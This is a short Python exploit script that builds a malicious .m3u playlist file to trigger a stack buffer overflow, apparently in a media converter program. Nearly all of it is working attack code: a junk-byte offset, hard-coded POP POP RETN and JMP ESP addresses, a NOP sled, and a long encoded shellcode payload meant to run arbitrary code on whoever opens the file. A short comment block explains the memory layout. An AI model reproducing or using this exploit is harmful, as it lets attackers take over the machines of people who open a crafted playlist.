'''
[A's]
[Overwrite EIP with address of POP POP RETN] - In case buffer is on stack
[SPCR] Spacer was needed to find ESP cleanly
[8 NOPS to simulate ESP offset]
[JMP ESP] - This is where esp will land after POP POP RETN. It will put this address in EIP
EIP runs JMP ESP
Shellcode at new ESP
'''


file = "evilconv2.m3u"

#eip 1100
#ffe4 01d6f23a
#badchars  \x00,\x09, \x0a
#pop pop retn 01b36a10







shellcode = "\x90"*8
shellcode += "\x3a\xf2\xd6\x01" #01d6f23a JMP ESP
shellcode +="\x90"*25
shellcode +=("\xdb\xd9\xd9\x74\x24\xf4\xba\xb2\x86\x3f\xfa\x5d\x29\xc9\xb1"
"\x54\x31\x55\x18\x03\x55\x18\x83\xc5\xb6\x64\xca\x06\x5e\xea"
"\x35\xf7\x9e\x8b\xbc\x12\xaf\x8b\xdb\x57\x9f\x3b\xaf\x3a\x13"
"\xb7\xfd\xae\xa0\xb5\x29\xc0\x01\x73\x0c\xef\x92\x28\x6c\x6e"
"\x10\x33\xa1\x50\x29\xfc\xb4\x91\x6e\xe1\x35\xc3\x27\x6d\xeb"
"\xf4\x4c\x3b\x30\x7e\x1e\xad\x30\x63\xd6\xcc\x11\x32\x6d\x97"
"\xb1\xb4\xa2\xa3\xfb\xae\xa7\x8e\xb2\x45\x13\x64\x45\x8c\x6a"
"\x85\xea\xf1\x43\x74\xf2\x36\x63\x67\x81\x4e\x90\x1a\x92\x94"
"\xeb\xc0\x17\x0f\x4b\x82\x80\xeb\x6a\x47\x56\x7f\x60\x2c\x1c"
"\x27\x64\xb3\xf1\x53\x90\x38\xf4\xb3\x11\x7a\xd3\x17\x7a\xd8"
"\x7a\x01\x26\x8f\x83\x51\x89\x70\x26\x19\x27\x64\x5b\x40\x2f"
"\x49\x56\x7b\xaf\xc5\xe1\x08\x9d\x4a\x5a\x87\xad\x03\x44\x50"
"\xd2\x39\x30\xce\x2d\xc2\x41\xc6\xe9\x96\x11\x70\xd8\x96\xf9"
"\x80\xe5\x42\x97\x85\x71\xc1\x77\x87\xee\x71\x8a\x87\xe1\xdd"
"\x03\x61\x51\x8e\x43\x3e\x11\x7e\x24\xee\xf9\x94\xab\xd1\x19"
"\x97\x61\x7a\xb3\x78\xdc\xd2\x2b\xe0\x45\xa8\xca\xed\x53\xd4"
"\xcc\x66\x56\x28\x82\x8e\x13\x3a\xf2\xee\xdb\xc2\x02\x9b\xdb"
"\xa8\x06\x0d\x8b\x44\x04\x68\xfb\xca\xf7\x5f\x7f\x0c\x07\x1e"
"\xb6\x66\x31\xb4\xf6\x10\x3d\x58\xf7\xe0\x6b\x32\xf7\x88\xcb"
"\x66\xa4\xad\x14\xb3\xd8\x7d\x80\x3c\x89\xd2\x03\x55\x37\x0c"
"\x63\xfa\xc8\x7b\xf0\xfd\x37\xf9\xd4\xa5\x5f\x01\x58\x56\xa0"
"\x6b\x58\x06\xc8\x60\x77\xa9\x38\x88\x52\xe2\x50\x03\x32\x40"
"\xc0\x14\x1f\x04\x5c\x14\x93\x9d\x89\x9b\x54\x22\xb6\x5d\x69"
"\xf4\x8f\x2b\xaa\xc4\xab\x24\x81\x69\x9d\xae\xe9\x3e\xdd\xfa")


buffer = "A"*(25000+1100)
buffer += "\x10\x6a\xb3\x01" #POP POP RETN
buffer += "SPCR" #4 byte spacer


buffer += shellcode


f = open(file, 'w')
f.write(buffer)
f.close()

